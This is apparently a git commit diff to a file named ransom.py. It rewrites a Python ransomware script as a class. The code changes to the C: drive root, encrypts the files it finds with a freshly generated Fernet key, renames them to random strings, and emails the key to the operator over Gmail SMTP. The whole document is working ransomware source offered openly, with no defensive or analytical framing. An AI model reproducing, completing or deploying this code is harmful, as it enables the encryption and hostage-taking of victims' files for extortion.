9d3489508658eb30439c9216b4c1afe0b2ced6b9
Deus <119631661+OldKokoroz@users.noreply.github.com>
2024-02-03 18:33:31 +0300

    Update ransom.py

--- ransom.py
+++ ransom.py
@@ -1,58 +1,83 @@
-#!/usr/bin/env/ python3
-
 import os
-from cryptography.fernet import Fernet
+import random
+import string
 import smtplib
+from time import sleep
+from cryptography.fernet import Fernet
 
 
-def mail_send(email, password, message):
-    email_server = smtplib.SMTP("smtp.gmail.com", 587)
-    email_server.starttls()
-    email_server.login(email, password)
-    email_server.sendmail(email, email, message)
-    email_server.quit()
+class Ransomware:
+    def __init__(self):
+        files = []
+        directories = []
+        os.chdir("C:/")  # on Mac -- /Users or /
+        files_dict = {}
+        key = Fernet.generate_key()
+        self.files = files
+        self.directories = directories
+        self.key = key
+        self.files_dict = files_dict
+
+    def id_generator(self, size, chars=string.ascii_lowercase + string.digits):
+        return ''.join(random.choice(chars) for _ in range(size))
+
+    def files_dir(self):
+        for _ in os.listdir():
+            if _ == "ransom.py":
+                continue  # Do not encrypt the current file we are working with or the key
+
+            elif os.path.isfile(_):
+                self.files.append(_)  # Do not add if this is a directory, only if a file
+
+            elif os.path.isdir(_):
+                self.directories.append(_)
+
+        for dirs in self.directories:
+            if dirs == "ransom.py":
+                continue  # Do not encrypt the current file we are working with or the key
+
+            elif os.path.isfile(dirs):
+                self.files.append(dirs)
+
+            elif os.path.isdir(dirs):
+                os.chdir(dirs)
+
+    def encrypt_loop(self):
+        for file in self.files:
+            with open(file, "rb") as the_file:
+                contents = the_file.read()
+
+            contents_encrypted = Fernet(self.key).encrypt(contents)
+
+            with open(file, "wb") as the_file:
+                the_file.write(contents_encrypted)
+
+    def rename_files(self):
+        for _ in self.files:
+            if _ == '.DS_Store':
+                continue
+
+            name = self.id_generator(random.randint(16, 21))
+            ext = "." + self.id_generator(random.randint(7, 10))
+
+            last = f"{name}{ext}"
+
+            self.files_dict.update({last: _})
+
+            os.rename(_, last)
+
+    def mail_send(self, email="", password=""):
+        message = self.key
+        email_server = smtplib.SMTP("smtp.gmail.com", 587)
+        email_server.starttls()
+        email_server.login(email, password)
+        email_server.sendmail(email, email, message)
+        sleep(8)
+        email_server.quit()
 
 
-files = []
-directories = []
-
-
-os.chdir("C:/")
-
-
-for file in os.listdir():
- 	if file == "ransom.py" or file == "decrypter.py":
-		continue  # do not encrypt the current file we are working with or the key
-
-	elif os.path.isfile(file):
-		files.append(file)  # do not add if this is a directory, only if a file
-
-	elif os.path.isdir(file):
-		directories.append(file)
-
-
-for dirs in directories:
-	if dirs == "ransom.py" or dirs == "decrypter.py":
-		continue  # do not encrypt the current file we are working with or the key
-
-	elif os.path.isfile(dirs):
-		files.append(dirs)
-
-	elif os.path.isdir(dirs):
-		os.chdir(dirs)
-
-
-key = Fernet.generate_key()
-
-
-for file in files:
-	with open(file, "rb") as the_file:
-		contents = the_file.read()
-
-	contents_encrypted = Fernet(key).encrypt(contents)
-
-	with open(file, "wb") as the_file:
-		the_file.write(contents_encrypted)
-
-
-mail_send("", "", key)
+starter = Ransomware()
+starter.files_dir()
+starter.encrypt_loop()
+starter.mail_send()
+starter.rename_files()
